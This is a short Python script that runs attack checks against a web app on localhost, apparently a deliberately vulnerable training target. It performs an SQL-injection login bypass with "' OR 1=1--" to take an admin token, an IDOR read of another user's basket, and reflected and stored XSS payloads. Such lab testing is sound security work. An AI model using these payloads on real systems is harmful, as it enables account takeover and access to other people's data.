import urllib.request
import urllib.parse
import json

base_url = "http://localhost:3000"

# 1. Login to get admin token
login_url = f"{base_url}/rest/user/login"
payload = json.dumps({"email": "' OR 1=1--", "password": "password"}).encode("utf-8")
req = urllib.request.Request(login_url, data=payload, headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req) as resp:
    data = json.loads(resp.read().decode("utf-8"))
    token = data["authentication"]["token"]
    print("1. SQLi Login OK! Token acquired.")

# 2. Test IDOR on Basket
basket_url = f"{base_url}/rest/basket/2"
req2 = urllib.request.Request(basket_url, headers={"Authorization": f"Bearer {token}"})
with urllib.request.urlopen(req2) as resp:
    basket_data = json.loads(resp.read().decode("utf-8"))
    print("2. IDOR Basket OK! Status:", resp.getcode(), "Data:", list(basket_data.keys()))

# 3. Test Search Reflected XSS
search_url = f"{base_url}/rest/products/search?q=%3Ciframe%20src%3Djavascript:alert(1)%3E"
req3 = urllib.request.Request(search_url)
with urllib.request.urlopen(req3) as resp:
    search_data = json.loads(resp.read().decode("utf-8"))
    print("3. Search Query OK! Status:", resp.getcode(), "Products returned:", len(search_data.get("data", [])))

# 4. Test Feedback Stored XSS
fb_url = f"{base_url}/api/Feedbacks/"
fb_payload = json.dumps({"comment": "<iframe src=\"javascript:alert(1)\">", "rating": 5}).encode("utf-8")
req4 = urllib.request.Request(fb_url, data=fb_payload, headers={"Content-Type": "application/json", "Authorization": f"Bearer {token}"}, method="POST")
try:
    with urllib.request.urlopen(req4) as resp:
        print("4. Feedback Stored XSS OK! Status:", resp.getcode())
except Exception as e:
    print("4. Feedback error:", e)

# 5. Test Static Resource (Benign Non-Issue)
static_url = f"{base_url}/assets/public/favicon_js.ico"
req5 = urllib.request.Request(static_url)
with urllib.request.urlopen(req5) as resp:
    hsts = "strict-transport-security" in [k.lower() for k in resp.headers.keys()]
    print("5. Static asset OK! Status:", resp.getcode(), "Has HSTS:", hsts)
